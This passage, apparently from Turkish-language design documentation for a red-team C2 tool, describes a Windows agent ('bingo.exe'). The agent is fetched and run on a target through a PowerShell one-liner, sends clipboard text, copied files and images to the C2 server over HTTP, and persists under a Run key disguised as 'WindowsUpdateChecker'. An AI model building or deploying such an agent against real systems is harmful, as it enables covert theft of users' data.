╰──────────────────────────────────────────────────────────────────────────────────╯
```

**Metin görüntüleme — `screen_view_entry()` (text)**

Dil tespit edilirse `rich.syntax.Syntax` ile Monokai temalı, satır numaralı gösterim.  
Dil tespit edilemezse plain text Panel içinde gösterilir.

**İkili dosya / resim görüntüleme:**

`downloads/` klasörüne kaydedilir, OS varsayılan uygulamasıyla otomatik açılır.

### 5.10 Veritabanı Yönetim Ekranı

```
╭─ Database ───────────────────────────╮
│ Path:      C:\...\C2\c2_data.db     │
│ Size:      2,048,576 bytes           │
│ Agents:    3                         │
│ Clipboard: 892 entries               │
╰──────────────────────────────────────╯

  [1] Clear ALL data  (agents + clipboard)
  [0] Back
```

Temizlik için `Confirm.ask` — `[y/n]` prompt, hatalı girişte tekrar sorar. Silme işlemi log WARNING.  
Agent menüsünden `[4]` ile tek agent silinebilir. Silme işlemi log INFO.

### 5.11 Başlatma Akışı ve Ana Döngü

**Startup sırası:**

```
main()
  │
  ├─ argparse → --host, --port, --agent-ip çözümlenir
  ├─ DOWNLOADS_DIR, AGENTS_DIR, LOGS_DIR oluşturulur
  ├─ _setup_logger() → logs/<ts>.log açılır
  ├─ db_init() → c2_data.db hazırlanır, agents{} belleğe yüklenir
  ├─ log SERVER START
  ├─ build_agent(agent_ip, port):
  │       └─ MSBuild ile bingo.exe derlenir → agents/bingo.exe
  ├─ PowerShell one-liner konsola yazdırılır
  ├─ "Press Enter to start C2..." — operatör beklenir
  ├─ Flask thread (daemon) başlatılır
  ├─ Heartbeat monitor thread (daemon) başlatılır
  └─ run_terminal_ui() → ana UI döngüsü
```

**Ana UI döngüsü:**

```python
def run_terminal_ui():
    while True:
        try:
            agent_id = new_agent_queue.get_nowait()  # Yeni agent var mı?
            screen_agent_menu(agent_id)               # Direkt menüye git
            continue
        except queue.Empty:
            pass

        agent_list = screen_agent_list()   # Ana ekranı göster
        choice = console.input("  > ")
        ...
```

Flask thread → `new_agent_queue.put(agent_id)` → UI thread `input()` döner → kuyruk boşaltılır → agent menüsü otomatik açılır.

---

## 6. İletişim Protokolü

| Endpoint | Yön | Sıklık | İçerik |
|----------|-----|--------|--------|
| `POST /api/agent/register` | Agent → C2 | Başlangıçta bir kez | Sistem bilgisi JSON |
| `POST /api/agent/<id>/clipboard` | Agent → C2 | Her clipboard değişiminde | Base64 + tip + dosya adı |
| `GET /api/agent/<id>/command` | Agent → C2 | Her 3 saniyede (polling + heartbeat) | Komut sorgusu |
| `GET /agent/bingo.exe` | Hedef → C2 | Deployment sırasında bir kez | EXE binary (HTTP indir) |

Tüm iletişim düz HTTP/JSON. Veri Base64 ile kodlanır. Max body: 200MB (Flask config).

---

## 7. Veri Akışı Diyagramı

```
C2 Başlar
    │
    ├─► _setup_logger() → logs/<ts>.log
    ├─► db_init() → c2_data.db yükle
    ├─► build_agent(ip, port) → bingo.exe derle
    ├─► PowerShell payload göster
    ├─► "Press Enter to start C2..." bekle
    └─► Flask + Heartbeat thread başlat

Agent Deploy (hedef sistemde)
    │
    ├─► PowerShell one-liner çalıştırılır
    │       └─ GET /agent/bingo.exe → bingo.exe indirilir
    │               └─ C2: log AGENT DOWNLOAD
    │
    └─► bingo.exe çalıştırılır

Agent Çalışır
    │
    ├─► LoadOrCreateAgentId()
    │       └─ Registry'den UUID oku / yoksa üret ve yaz
    │
    ├─► RegisterAgent()
    │       └─ POST /api/agent/register
    │               └─ C2: agents{} + DB ← new_agent_queue ← Rich Panel ← log NEW
    │
    ├─► AddClipboardFormatListener(HWND_MESSAGE)
    │
    ├─► CommandPollThread [arka plan, her 3s]
    │       └─ GET /api/agent/<id>/command
    │               └─ C2: last_seen güncelle
    │               ├─ "kill"    → SelfDestruct() ← log COMMAND SENT [geri dönmez]
    │               ├─ "persist" → AddPersistence() ← log COMMAND SENT
    │               └─ "none"   → devam
    │
    └─► Mesaj Döngüsü
            └─ WM_CLIPBOARDUPDATE
                    ├─ CF_UNICODETEXT → UTF-8 → Base64 → POST (text) ← log CLIPBOARD
                    ├─ CF_HDROP       → Dosya oku → Base64 → POST (file) ← log CLIPBOARD
                    └─ CF_DIB         → DibToBmp → Base64 → POST (image) ← log CLIPBOARD

C2 Heartbeat Monitor [arka plan, her 5s]
    └─ last_seen > 10s → status="dead" → DB güncelle → log DEAD → Kırmızı bildirim
```

---

## 8. Güvenlik Notları

Bu araç yalnızca **yetkilendirilmiş** ortamlarda (penetration testing, red team tatbikatları, güvenlik araştırması) kullanım içindir.

**Bilinen kısıtlamalar:**

| Kısıt | Detay |
|-------|-------|
| HTTP plain text | MITM'e açık — production'da HTTPS/TLS eklenebilir |
| Self-destruct | `ShellExecuteA + .bat` yöntemi Win10/11'de güvenilir değil |
| Polling gecikmesi | Komut teslimi max 3s gecikmeli |
| Dosya limiti | 50MB üzeri kırpılır |
| Tek yönlü komut | Sadece kill / persist — tasarım gereği |
| Log dosyaları | `logs/` dizini operasyon sonunda manuel temizlenmeli |

**Temizlik:**

```
Agent tarafı:
  kill komutu     → registry + Run key + EXE silinir
  Persistence     → reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f

C2 tarafı:
  Tek agent sil   → Agent Menüsü → [4]
  Tam temizlik    → Ana Menü → [D] → [1] → Confirm
  Log dosyaları   → C2/logs/ dizini manuel silinmeli
  Agent EXE       → C2/agents/bingo.exe manuel silinmeli
```
